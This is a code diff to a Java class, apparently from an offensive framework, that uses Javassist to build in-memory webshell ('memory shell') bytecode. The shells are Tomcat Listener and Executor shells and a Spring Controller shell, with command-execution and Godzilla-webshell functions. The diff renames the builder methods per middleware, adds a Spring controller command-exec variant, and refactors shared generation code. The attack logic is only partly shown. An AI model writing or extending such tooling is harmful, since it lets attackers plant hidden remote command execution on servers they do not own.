@@ -15,10 +15,13 @@ import javassist.CtMethod;
  */
 @Builder(Builder.MS)
 public class MSJavaClassBuilder {
+    /**
+     * Tomcat
+     */
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Exec)
-    public byte[] listenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+    public byte[] tomcatListenerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
         classPool.importPackage("javax.servlet.http");
@@ -58,9 +61,10 @@ public class MSJavaClassBuilder {
         return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 
+    @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Listener)
     @MemShellFunction(MemShellFunction.Godzilla)
-    public byte[] listenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+    public byte[] tomcatListenerGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
         classPool.importPackage("javax.servlet.http");
@@ -79,22 +83,37 @@ public class MSJavaClassBuilder {
         return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 
+    @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Executor)
     @MemShellFunction(MemShellFunction.Exec)
-    public byte[] executorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+    public byte[] tomcatExecutorExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    /**
+     * Spring
+     */
+    @Middleware(Middleware.Spring)
+    @MemShell(MemShell.Controller)
+    @MemShellFunction(MemShellFunction.Exec)
+    public byte[] springControllerExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
         classPool.importPackage("javax.servlet.http");
 
         CtClass ctClass = classPool.getCtClass(cls.getName());
 
-        if (javaClassHelper.isRandomJavaClassName()) {
-            // 随机类名
-            String javaClassName = JavaClassModifier.randomJavaClassName(javaClassHelper);
-            javaClassHelper.setCLASSNAME(javaClassName);
-        } else {
-            javaClassHelper.setCLASSNAME(cls.getName());
-        }
+//        if (javaClassHelper.isRandomJavaClassName()) {
+//            // 随机类名
+//            String javaClassName = JavaClassModifier.randomJavaClassName(javaClassHelper);
+//            javaClassHelper.setCLASSNAME(javaClassName);
+//        } else {
+//            javaClassHelper.setCLASSNAME(cls.getName());
+//        }
         // 字段信息修改
         JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
 
